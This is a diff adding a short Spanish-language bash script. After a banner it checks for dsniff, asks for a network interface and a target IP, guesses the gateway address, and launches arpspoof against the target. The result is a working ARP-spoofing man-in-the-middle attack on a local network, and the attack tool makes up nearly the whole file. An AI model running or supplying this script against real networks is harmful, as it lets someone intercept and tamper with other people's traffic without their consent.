@@ -1,0 +1,25 @@
+#!/bin/bash
+
+echo -e "\031\93mCreado por Tcuadratico\031[0m"
+
+cat << "EOF"
+  	//
+	/////
+  ///////
+ ///////
+///////
+EOF
+
+check_herramienta() {
+  	if ! [ -x "$(command -v $1 )" ]; then
+   	echo "Error $1 parece que no esta instalado. Por favor, instala $1 y vuelva a  intentarlo." >&2
+   	exit  1
+ 	fi
+}
+check_herramienta "dsniff"
+read -p "inserta la interfaz de red que queiras analizar (wlan0,eth0...): " interfaz
+read -p "inseta la IP objetivo: " ip
+puerta_enlace=$(echo $ip  |  sed 's/\([0-9]\+\)$/1/g')
+
+
+arpspoof -i "$interfaz" -t "$ip" "$puerta_enlace"
